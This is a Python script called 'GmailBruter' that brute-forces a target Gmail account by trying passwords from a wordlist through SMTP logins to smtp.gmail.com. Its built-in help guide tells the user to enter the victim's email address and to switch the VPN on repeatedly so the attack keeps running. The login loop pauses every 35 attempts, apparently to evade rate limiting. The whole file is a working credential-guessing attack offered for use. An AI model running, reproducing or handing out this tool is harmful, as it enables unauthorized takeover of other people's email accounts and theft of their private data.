import smtplib
import os           
import time                      
import sys           
           
           
print("""
                                               _________________________________________________
                                              |=================================================|
                                              |            +[Author => Mohamed Dief]+           |
                                              |=================================================|
                                              |              ---------------------              |
                                              |              | GmailBruter(V1.1) |              |
                                              |              ---------------------              |
                                              |=================================================|
                                              |                                                 |
                                              |[+]Github: github.com/DEMON1A                    |
                                              |[+]Facebook: facebook.com/mohamed.dief.1029      |
                                              |[+]Twitter: twitter.com/Demon77098812            |
                                              |[+]Email: mdaif1332@gmail.com                    |
                                              |_________________________________________________|
""")

print("[1]Start")
print("[2]Help Guide")
print("[3]Contact Me")
print("[4]Exit")

answer = input("\n==> ")

if answer == '1':
  pass
elif answer == '2':
  print("[+]Loading The Help Guide!")
  time.sleep(5)
  os.system("clear")
  print("--------------------------------------------------")
  print("[1]The Script Will Show You A Guide For 20s")
  print(" ")
  print("[2]Make Sure You Are Connected To The Internet")
  print(" ")
  print("[3]Enter Target Email Adress")
  print(" ")
  print("[4]Enter Wordlist Name")
  print("        EX: WordList.txt")
  print(" ")
  print("[5]Turn On VPN After Start GmailBruter To Avoid Stopping The Script")
  print("        EX: Psiphon Bro VPN")
  print(" ")
  print("[6]Wait For Start Brute Force!")
  print(" ")
  print("[!]Some Notes...")
  print("      [*]You Should Put Wordlist In the Same Folder Or Place With Script.")
  print("      [*]Turn On The VPN Repeatedly...")
  print("      [*]If Internet is Slow It Makes an Error And if The Password is Right It tell you Password Not Found")
  print(" ")
  print("[+]For More Scripts Visit My Github Account!")
  print("--------------------------------------------------")
  time.sleep(20)
  os.system("clear")

  ys = input("Do You Want Start Brute Force? (Y for Yes | N for No): ")
  if ys == "Y":
    pass
  elif ys == "N":
    sys.exit()
  else:
    print("[-] We Can Not Understand Your Answer. plz Check it!")
    sys.exit()  

elif answer == '3':
  print("[+]Wait...")
  time.sleep(5)
  print("\n[+]Github: github.com/DEMON1A")
  print("[+]Facebook: facebook.com/mohamed.dief.1029")
  print("[+]Twitter: twitter.com/Demon77098812")
  print("[+]Email: mdaif1332@gmail.com")

  yn = input("\nDo You Want Start Brute Force? (Y for Yes | N for No): ")
  if yn == "Y":
    pass
  elif yn == "N":
    sys.exit()
  else:
    print("[-] We Can Not Understand Your Answer. plz Check it!")
    sys.exit()
elif  answer == '4':
  sys.exit()
else:
  print("[-] We Can Not Understand Your Answer. plz Check it!")
  sys.exit()

###############........................###############

smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
smtpserver.ehlo()
smtpserver.starttls()
Email = input("[*]Enter Email Adress: ")
pw = input("[*]Enter Password List Name: ")
PWF = open(pw, "r")
num = 0


print(" ")
print("[*]Start Brute Force!")

                                  ###Coded By Mohamed Dief(DEMON1A)###

for Password in PWF:
    try:
        smtpserver.login(Email, Password)
        print("[+]Password Found: {0}".format(Password))
        os.system("clear")
        print("++++++++++++++++++++++++++++++++++++++++++++++++")
        print(" ")
        print("[+]Email Is {0}".format(Email))
        print("[+]Password Is {0}".format(Password))
        print(" ")
        print("[*]Done")
        print("++++++++++++++++++++++++++++++++++++++++++++++++")
        break
    except smtplib.SMTPAuthenticationError:
        print("[!]Password Not Found: {0}".format(Password))
        num = num + 1
        if num == 35:
            time.sleep(6)
            num = num - 35

print("\n[+]For More Tools Visit My Github Account!")
